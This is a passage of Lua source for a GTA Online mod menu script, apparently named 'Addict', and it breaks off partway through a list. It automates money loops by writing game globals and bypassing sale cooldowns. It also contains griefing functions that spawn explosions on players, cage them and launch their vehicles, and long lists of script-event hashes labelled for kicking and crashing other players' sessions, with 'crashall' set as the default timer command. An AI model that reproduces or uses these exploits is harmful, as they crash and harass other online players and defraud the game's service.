    monitor_cargo =             ">Special Cargo>Monitor",
    max_sell_price =            ">Special Cargo>Max Sell Price",
    nobuycd =                   ">Special Cargo>Bypass Buy Mission Cooldown",
    nosellcd =                  ">Special Cargo>Bypass Sell Mission Cooldown",
    acbuy =                     ">Special Cargo>Autocomplete Buy Mission",
    acsell =                    ">Special Cargo>Autocomplete Sell Mission",
    sellcrate =                  ">Special Cargo>Press To Sell A Crate",
    max_crate_sourcing_amount = ">Special Cargo>Max Crate Sourcing Amount",
    minimize_delivery_time =    ">Special Cargo>Minimize Delivery Time",
    find_safer_ways =           ">Find safer ways to make money"
}


if idiot_proof and not does_path_exist(main_mb_path .. relative_paths.find_safer_ways) then
elseif idiot_proof and not SCRIPT_SILENT_START then 
    util.toast("MB is already loaded. Nice!")
end

local selected_whouse_ref = menu.ref_by_path(main_mb_path .. relative_paths.selected_whouse)
local tp_to_whouse_ref = menu.ref_by_path(main_mb_path .. relative_paths.teleport_to_whouse)
local sell_a_crate_ref = menu.ref_by_path(main_mb_path .. relative_paths.sellcrate)

local settings_to_apply = {
    ["noidlekick"] = {ref=menu.ref_by_path("Online>Enhancements>Disable Idle/AFK Kick", 38),         state=true},
    ["noidlecam"] = {ref=menu.ref_by_path("Game>Disables>Disable Idle Camera", 38),                 state=true},
    ["monitorcargo"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.monitor_cargo),            state=true},
    ["maxsellprice"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.max_sell_price),           state=true},
    ["nobuycd"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.nobuycd),                  state=true},
    ["nosellcd"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.nosellcd),                 state=true},
    ["acbuy"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.acbuy),                    state=true},
    ["acsell"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.acsell),                   state=true},
    ["max_crate_sourcing_amount"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.max_crate_sourcing_amount),state=true},
    ["minimize_delivery_time"] = {ref=menu.ref_by_path(main_mb_path .. relative_paths.minimize_delivery_time),   state=true},
}

local my_root = cargoloo

local sell_delay = 2000
my_root:slider("Sell delay", {"crateselldelay"}, "The delay in MS to sell crates at.\nThe lower, the more chance of the warehouse scaleform freezing up on you. Up to you.\n1500-2000ms delay recommended based on your network connection", 10, 10000, 2000, 10, function(delay)
    sell_delay = delay
end)
my_root:action("Get crates", {"fillcurrentwhouse"}, "", function()
    if util.is_session_started() then
        menu.set_value(settings_to_apply.max_crate_sourcing_amount.ref, true)
        menu.set_value(settings_to_apply.minimize_delivery_time.ref, true)
        STATS.SET_PACKED_STAT_BOOL_CODE(32359 + menu.get_value(selected_whouse_ref), true, -1)
    end
end)
local appsecuroserv = util.joaat("appsecuroserv")
local money_loop = false
my_root:toggle("Sell crates loop", {"sellcratesloop"}, "Note: Use Keyboard to turn on. Auto-sells the crates of the CURRENTLY SELECTED WAREHOUSE IN MB, and skips transaction errors.", function(on)
    util.show_corner_help("Open Musiness Banager > Special Cargo (Tick all apart from AFK Loop) Then start this cargo loop.")
    menu.set_help_text(cashloops, my_root)
    menu.trigger_commands("autoenter")
    money_loop = on
    while true do 
        if not money_loop then 
            break 
        end
        if util.is_session_started() then
            -- force required settings
            for _, data in pairs(settings_to_apply) do
                assert(data.ref:isValid(), "MusinessBanager is not started")
                if menu.get_value(data.ref) ~= data.state then
                    menu.set_value(data.ref, data.state)
                end
            end
            STATS.SET_PACKED_STAT_BOOL_CODE(32359 + menu.get_value(selected_whouse_ref), true, -1)
            menu.trigger_command(sell_a_crate_ref)
            util.yield(800)
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 238, 1.0)
            local end_time = os.time() + 2
            while SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(appsecuroserv) > 0 and os.time() < end_time do
                util.yield()
            end
            if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(appsecuroserv) > 0 and sell_delay < 1000 then
                kill_appsecuroserv()
            end
            end_time = os.time() + 5
            while NETSHOPPING.NET_GAMESERVER_TRANSACTION_IN_PROGRESS() and os.time() < end_time do
                util.yield()
            end
        end
        util.yield(sell_delay)
    end
end)

util.keep_running()


function tp1()
	TELEPORT(997.9699, -3108.72, -38.999863)
	SET_HEADING(145)
end

function tp2()
	TELEPORT(1024.3882, -3098.5376, -38.99992)
	SET_HEADING(260)
end

function tp3()
	TELEPORT(1002.05, -3093.4438, -38.999928)
	SET_HEADING(20)
end

function tpexit()
	TELEPORT(992.33, -3097.64, -38.999928)
	SET_HEADING(90)
end

function tpfps()
	TELEPORT(457.25537, 5571.8975, 781.1837)
end

function TELEPORT(X, Y, Z)
    local Handle = PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) or players.user_ped()
    ENTITY.SET_ENTITY_COORDS(Handle, X, Y, Z)
end

function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end

function format_int(number) -- Credits to Bart Kiers from stackoverflow
  local i, j, minus, int, fraction = tostring(number):find('([-]?)(%d+)([.]?%d*)')
  int = int:reverse():gsub("(%d%d%d)", "%1,")
  return minus .. int:reverse():gsub("^,", "") .. fraction
end

local function exportstring( s )
    return string.format("%q", s)
end

function table.save(  tbl,filename )
   local charS,charE = "   ","\n"
   local file,err = io.open( filename, "wb" )
   if err then return err end
   -- initiate variables for save procedure
   local tables,lookup = { tbl },{ [tbl] = 1 }
   file:write( "return {"..charE )
   for idx,t in ipairs( tables ) do
      file:write( "-- Table: {"..idx.."}"..charE )
      file:write( "{"..charE )
      local thandled = {}
      for i,v in ipairs( t ) do
         thandled[i] = true
         local stype = type( v )
         -- only handle value
         if stype == "table" then
            if not lookup[v] then
               table.insert( tables, v )
               lookup[v] = #tables
            end
            file:write( charS.."{"..lookup[v].."},"..charE )
         elseif stype == "string" then
            file:write(  charS..exportstring( v )..","..charE )
         elseif stype == "number" then
            file:write(  charS..tostring( v )..","..charE )
         end
      end
      for i,v in pairs( t ) do
         -- escape handled values
         if (not thandled[i]) then
            local str = ""
            local stype = type( i )
            -- handle index
            if stype == "table" then
               if not lookup[i] then
                  table.insert( tables,i )
                  lookup[i] = #tables
               end
               str = charS.."[{"..lookup[i].."}]="
            elseif stype == "string" then
               str = charS.."["..exportstring( i ).."]="
            elseif stype == "number" then
               str = charS.."["..tostring( i ).."]="
            end
            if str ~= "" then
               stype = type( v )
               -- handle value
               if stype == "table" then
                  if not lookup[v] then
                     table.insert( tables,v )
                     lookup[v] = #tables
                  end
                  file:write( str.."{"..lookup[v].."},"..charE )
               elseif stype == "string" then
                  file:write( str..exportstring( v )..","..charE )
               elseif stype == "number" then
                  file:write( str..tostring( v )..","..charE )
               end
            end
         end
      end
      file:write( "},"..charE )
   end
   file:write( "}" )
   file:close()
end

function table.load( sfile )
   local ftables,err = loadfile( sfile )
   if err then return _,err end
   local tables = ftables()
   for idx = 1,#tables do
      local tolinki = {}
      for i,v in pairs( tables[idx] ) do
         if type( v ) == "table" then
            tables[idx][i] = tables[v[1]]
         end
         if type( i ) == "table" and tables[i[1]] then
            table.insert( tolinki,{ i,tables[i[1]] } )
         end
      end
      -- link indices
      for _,v in ipairs( tolinki ) do
         tables[idx][v[2]],tables[idx][v[1]] =  tables[idx][v[1]],nil
      end
   end
   return tables[1]
end
-- END UTILITY FUNCTIONS

store_dir = filesystem.store_dir() .. '\\Addict\\'
if not filesystem.is_dir(store_dir) then
    filesystem.mkdirs(store_dir)
end

local max_timer_time = 86400000
local all_timer_lists = {}
local parse_all_timer_files

function create_timer_entry(data)
    local data_copy = data
    local timer_name = data['timer_name']
    local timer_desc = data['timer_desc']
    local timer_commands = data['timer_commands']
    local timer_delay = data['timer_delay']
    local this_timer_path = store_dir .. '\\' .. timer_name .. '.lua'
    local fmt_name = timer_name:gsub(' ', '')
    if all_timer_lists[timer_name] == nil then
        local this_timer_root = menu.list(menu.my_root(), timer_name, {'Addict' .. fmt_name}, timer_desc)
        all_timer_lists[timer_name] = this_timer_root
        menu.toggle_loop(this_timer_root, "Run timer", {"runtimer" .. timer_name}, "", function(click_type)
            menu.trigger_commands(timer_commands)
            util.yield(timer_delay)
        end)

        menu.text_input(this_timer_root, "Description", {"Addictsetdesc" .. fmt_name}, "", function(on_input)
            timer_desc = on_input
            data_copy['timer_desc'] = on_input
            table.save(data_copy, this_timer_path)
            menu.set_help_text(this_timer_root, timer_desc)
        end, timer_desc)

        menu.text_input(this_timer_root, "Command(s)", {"Addictsetcommands" .. fmt_name}, "The commands for this timer. You can specify multiple by putting semicolons in between each.", function(on_input)
            timer_commands = on_input
            data_copy['timer_commands'] = on_input
            table.save(data_copy, this_timer_path)
        end, timer_commands)

        menu.slider(this_timer_root, "Timer delay (MS)", {fmt_name .. "delay"}, "The timer delay, in milliseconds. 1000 ms = 1 second.", 0, max_timer_time, 100, 1, function(s)
            timer_delay = s
            data_copy['timer_delay'] = s
            table.save(data_copy, this_timer_path)
        end)

        menu.action(this_timer_root, "Delete timer", {}, "Delete this timer\'s file.", function(click_type)
            ok, err = os.remove(this_timer_path)
            if not ok then
                util.toast("Timer could not be removed: " .. err)
            else
                all_timer_lists[timer_name] = nil
                util.toast("Timer removed.")
                menu.delete(this_timer_root)
                parse_all_timer_files()
            end
        end)
    end
end

function parse_all_timer_files()
    for i, path in ipairs(filesystem.list_files(store_dir)) do
        if string.match(path:gsub(store_dir, ''), '.lua') then
            local timer_data = table.load(path)
            create_timer_entry(timer_data)
        end
    end
end

function SET_INT_GLOBAL(global, value)
    memory.write_int(memory.script_global(global), value)
end

function STEALTH_LOOP_COMBINED()
    SET_INT_GLOBAL(1968313, 1)
 util.log("$ 500K Added")
  util.yield(1)
    SET_INT_GLOBAL(1968313, 2)
    util.log("$ 750K Added")
  util.yield(1)
 end
 function timer(timer)
     i = timer * 1400
     x = 0
     while(x < i)
     do
         wait()
         x = x + 1
     end
 end

cashloop = menu.list(cashloops, "500k + 750k Loop", {}, "$$$ Loop", function(); end)

menu.toggle_loop(cashloop, 'Start $$$ Loop', {""}, '500k + 750k Loop Every 10 Seconds. Warning! Dont go over 50 million a day.', function()
    STEALTH_LOOP_COMBINED()
    menu.trigger_commands("autoenter")
    util.yield(1000)
    menu.trigger_commands("autoenter")
    util.yield(10000)
end)


local create_timer_root = menu.list(menu.my_root(), "Create new timer", {'Addictcreate'}, "")
----

local new_timer_name = "My new timer"
menu.text_input(create_timer_root, "Name", {"Addictsetname"}, "", function(on_input)
    new_timer_name = on_input
end, new_timer_name)

local new_timer_desc = "Your description goes here."
menu.text_input(create_timer_root, "Description", {"Addictsetdesc"}, "", function(on_input)
    new_timer_desc = on_input
end, new_timer_desc)

local new_timer_commands = "crashall"
menu.text_input(create_timer_root, "Command(s)", {"Addictsetcommands"}, "The commands for this timer. You can specify multiple by putting semicolons in between each.", function(on_input)
    new_timer_commands = on_input
end, new_timer_commands)

local new_timer_delay = 100
menu.slider(create_timer_root, "Timer delay (MS)", {"Addictsetdelay"}, "The timer delay, in milliseconds. 1000 ms = 1 second.", 0, max_timer_time, 100, 1, function(s)
    new_timer_delay = s
end)

menu.action(create_timer_root, "Create timer", {}, "Create and save this timer as a file.", function(click_type)
    local new_timer_data = {
        timer_name = new_timer_name,
        timer_desc = new_timer_desc,
        timer_commands = new_timer_commands,
        timer_delay = new_timer_delay
    }
    local timer_path = store_dir .. '/' .. new_timer_name .. '.lua'
    if filesystem.exists(timer_path) then
        util.toast("A timer with that name already exists.")
        return 
    else
        table.save(new_timer_data, timer_path)
        parse_all_timer_files()
        menu.trigger_commands("Addict" .. new_timer_name:gsub(' ', ''))
        util.toast("Timer created! I\'ve opened it for you :)")
    end
end)

util.create_thread(function()
    while true do
        parse_all_timer_files()
        util.yield()
    end
end
)

util.keep_running(100)

local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
        callback()
    end)
end


local resource_dir = filesystem.resources_dir()
if not filesystem.exists(resource_dir) then
	util.toast("resource directory not found. --notification system will be less of a bruh")
else
	util.register_file(resource_dir .. "bruhzowski.ytd")
end

local version = 16


local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, --, 21, 96
blue = 11
}


function arg11(pid)
    return (1630317 + (1 + (pid * 595) + 506))
end

function v3(x, y, z)
	if x == nil then x = 0 end
	if y == nil then y = 0 end
	if z == nil then z = 0 end
end

function draw_box(x, y, width, height, opacity)
    color = {}
    color["r"] = 0.07
    color["g"] = 0.07
    color["b"] = 0.07
    color["a"] = opacity - 0.02
    directx.draw_rect(x, y - 0.0015, width, height + 0.0015, color)
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function get_control_request(ent) -- #testing -- new get control request, yield first then request, then return. previously requested then yielded then returned and didnt work?
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
			tick = tick + 1
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		end
	end
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		util.toast("No Control of "..ent)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end

function tp_vehicle_to(veh,x,y,z) -- #unfinished -- will this ever be finished or is this just a pointless alias for a native? i dont know.
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh,x,y,z,0,0,0)
end


function do_fade_in(pid) 
    CAM.DO_SCREEN_FADE_OUT(500)
    util.yield(500)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    orbital_cannon_effects(true)
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function do_fade_out(pid)
    util.yield(2500)
    CAM.DO_SCREEN_FADE_OUT(1000)
    util.yield(1000)
    orbital_cannon_effects(false)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off;nightvision off")
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function orbital_cannon_effects(on)
    if on then
        menu.trigger_commands("becomeorbitalcannon on;nightvision on;fov 130")
    else 
        menu.trigger_commands("becomeorbitalcannon off;fov 0;nightvision off")
    end
end
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

cages = {}  -- 1114264700 <- vending machine cage
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		--notification("Something Went Wrong Creating Cages", colors.red)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end


function for_table_do(table,with_access,func) -- <3 HoppaC4
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent) then goto skip end
		end
		func(ent)
		::skip::
	end
end


function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end

function tp_veh_to(pid,x,y,z)
	local tries = 0
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = get_player_veh(pid,false)	
		while tries <= 1000 do --bad coooooood >:( but idk anything better
			if RequestControlOfEnt(vehicle) then			
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, x, y, z, 0, 0, 1);
				tries = tries + 1
			end
		end
	end
end

function marqee(text)
	local temp = text
    text = text:sub(2)
	return text .. temp:sub(1, 1)
end

function upgrade_vehicle(player) --now my funky functions are useless :'( since u can do menu.trigger_commands("upgrade") or some shit
	local vehicle = get_player_veh(player,true)
        if vehicle then
            DECORATOR.DECOR_SET_INT(vehicle, "MPBitset", 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
            for i = 0 ,50 do
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 13, false)
            end	
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 80, 0, 255, chrome)
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle,80, 0, 255, chrome)
            VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, 10)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 17, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 19, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 21, true)
            for i = 0 ,4 do
                if not VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, i) then
                    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, i, true)
                end
            end
            VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, 255, 0, 255)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Addict")
	end
end

function launch_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
	end
end

function bounce_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 1.5, true, false, true)
	end
end

function northp_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 10000, 0, true, false, true)
	end
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end

--[[

function --notification(message, color)
	HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(color)
	local picture
	if not filesystem.exists(resource_dir) then
		picture = "CHAR_SOCIAL_CLUB"
	else
		picture = "bruhzowski"
	end
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 1)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
	if color == colors.red or color == colors.red then
		subtitle = "~u~--notification"
	elseif color == colors.black then
		subtitle = "~c~--notification"
	else
		subtitle = "~u~--notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, "Mike", true, 4, "Addict Script", subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

--notification("Addict Script has been successfully loaded!", colors.green)

]]

    local kicks = {
    0x493fc6bb,
    1228916411,
    1256866538,
    -1753084819,
    1119864805,
    -1813981910,
    -892744477,
    -859672259,
    -898207315,
    548471420,
    -30654421,
    -2113865699,
    1681920018,
    1096448327,
    113023613,
    42967925,
    1746765664,
    538193013,
    1163337421,
    1110452930,
    -596760615,
    -140109523,
    1398154308,
    181375724,
    672437644,
    -1765092612,
    -338166051,
    2100923829,
    -1822401313,
    1242664595,
    -1962062913,
    -2085699648,
    -1185502051,
    -193885642,
    1401157001,
    -459327862,
    -2001677186,
    -419652151,
    85920017,
    -1891171016,
    1227699211,
    414506075,
    1519903406,
    871267300,
    -2029579257,
    -1453392398,
    1192608757,
    2067191610,
    1694464420,
    -1518599654,
    1397900875,
    -1548871816,
    -852914485,
    -333917558,
    -644115601,
    1875524648,
    1765085190,
    -91833327,
    886761285,
    1900384925,
    -1328646658,
    134199208,
    -1392241127,
    -795380017,
    1804829460,
    1370461707,
    1813766002,
    -964882004,
    2080651008,
    -860929776,
    1999063780,
    1456052554,
    1167971813,
    -1963501380,
    -162943635,
    -1047334626,
    -580709734,
    448968075,
    -672300651,
    1009548335,
    2034045540,
    217196385,
    1607508898,
    1368347173,
    1772461754,
    -492741651,
    -1230153214,
    2092740896,
    -876146989,
    477242315,
    1903858674,
    1128918904,
    -519597839,
    1077951879,
    285546291,
    857538507,
    -328486618,
    2118577282,
    1810679938,
    -1322082704,
    518811989,
    -1578682814,
    1807254743,
    2144693378,
    1200439149,
    -513394492,
    2041060862,
    -1472351847,
    -484141204,
    -141450727,
    -1575137150,
    854806881,
    -839043921,
    -2105209800,
    -1001891935,
    -1593201907,
    -851885842,
    -970362313,
    -382052039,
    -871545888,
    2060563275,
    309814753,
    -285454749,
    755923450,
    1304332204,
    -381818092,
    1819411281,
    1250480109,
    -766974585,
    1264221127,
    1541446437,
    -2044863341,
    -1424012222,
    -1127353498,
    2005059642,
    167413139,
    669039275,
    -507112185,
    -1479027099,
    -1090858280,
    186548319,
    -1878484856,
    -16793987,
    1322812076,
    898343266,
    -438023591,
    -2048374263,
    -1609136786,
    434570842,
    937151636,
    1272793301,
    988586503,
    -1173163558,
    -1714789749,
    1589823260,
    -23082252,
    1041200857,
    -1555358611,
    127955867,
    375962343,
    1001517091,
    1345672987,
    -1168208444,
    -730912208,
    2084633812,
    792153085,
    1473913668,
    -343495611,
    1491806827,
    1039282949,
    -1460955723,
    317177044,
    -1834446996,
    1552900972,
    -2028335784,
    -241418449,
    -1653861842,
    -259156293,
    1594928808,
    -1556962447,
    1640286562,
    -1139254401,
    -949018811,
    1803131174,
    -71273283,
    -119249570,
    -53458173,
    -1003348271,
    -1123400822,
    1772495870,
    -1701192924,
    -1218087738,
    -10982782,
    814496833,
    -1094380288,
    319685114,
    -323171360,
    820416549,
    1835182208,
    337732417,
    -124020592,
    1221375594,
    2144481042,
    -749491288,
    -882028108,
    -1370028781,
    -1261736727,
    1037705593,
    1377857852,
    1168623138,
    -310617732,
    908767058,
    1409556665,
    -1387723751,
    -1492841786,
    1674476795,
    232443159,
    178524407,
    986260144,
    653628905,
    -168599209,
    474413179,
    -2051844999,
    1560973005,
    -904555865,
    879177392,
    -2060526162,
    -994591791,
    388881138,
    1674317759,
    1486774330,
    489739448,
    -398684455,
    -841455067,
    1379379239,
    2046296859,
    1311159119,
    -760942281,
    -1831959078,
    1848110702,
    -364713137,
    -1643482755,
    -1464365333,
    1327169001,
    1620260542,
    245065909,
    -1597942809,
    1071490035,
    1920583171,
    265836764,
    1303606785,
    267489225,
    1569236577,
    -469493996,
    360244585,
    1134514966,
    -2139562045,
    279717272,
    10138018,
    -725780952,
    396538098,
    -1029914669,
    -1296375264,
    -805921310,
    -468188833,
    1923972962,
    -444617715,
    -248680084,
    -1419450740,
    1279059857,
    -150763833,
    -720665383,
    -278036454,
    -1389482213,
    -1954654708,
    -204643402,
    -1496673706,
    1292306623,
    1950531948,
    -1990614866,
    1124104301,
    -646004404,
    -1216295492,
    -859612223,
    -1781653678,
    1083015459,
    -933673939,
    434937615,
    -957260626,
    -975458684,
    -1640403704,
    -1322731185,
    -1129868216,
    316066012,
    1454834612,
    700267046,
    -1730284249,
    1074803562,
    178476176,
    -509252369,
    1304577008,
    -102043551,
    -1526561203,
    -1612608404,
    895397362,
    1802646519,
    1268038438,
    1927489513,
    1046014587,
    549145155,
    -1237225255,
    1500075603,
    81880333,
    -1484508675,
    -2059117919,
    1332590686,
    -910497748,
    -1141914502,
    -1582289420,
    -76043076,
    2144523214,
    243072129,
    2064487849,
    435675531,
    -500923695,
    1336084487,
    323981539,
    567662973,
    -1571441360,
    -1054040893,
    843316754,
    169410705,
    491906476,
    796658339,
    974054812,
    508339812,
    431653434,
    1341265547,
    -1168222636,
    -715264067,
    1121720242,
    931417473,
    -583098065,
    1586286277,
    -1330848029,
    -1448015548,
    561154955,
    -1471373324,
    1306214888,
    -91898414,
    90440793,
    914476312,
    815640525,
    -394088790,
    1858712297,
    -1743542712,
    49863291,
    1025036241,
    -508465573,
    1810531023,
    2119903152,
    507886635,
    -1057685265,
    915462795,
    -1069140561,
    1491410017,
    -1601139550,
    -290401917,
    -1357080740,
    -299190545,
    -1443768844,
    1354970087,
    1796894334,
    392606458,
    697566862,
    1402665684,
    -1694531511,
    393633835,
    1292973690,
    1605689751,
    1883636994,
    1814318034,
    -50961790,
    -93722397,
    1775863255,
    125899875,
    -1217949151,
}


local Addictcrashes = {
-877478386,
-442313018,
-877478386,
2099682835,
69874647,
924535804,
1494472464,
-1991317864,
1902624891,
127278285,
-195247709,
-1322571352,
704979198,
-1970125962,
2112408256,
677240627,
-2113023004,
-1704141512,
962740265,
-1386010354,
603406648,
-1715193475,
1258808115,
998716537,
163598572,
-1056683619,
-393294520,
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
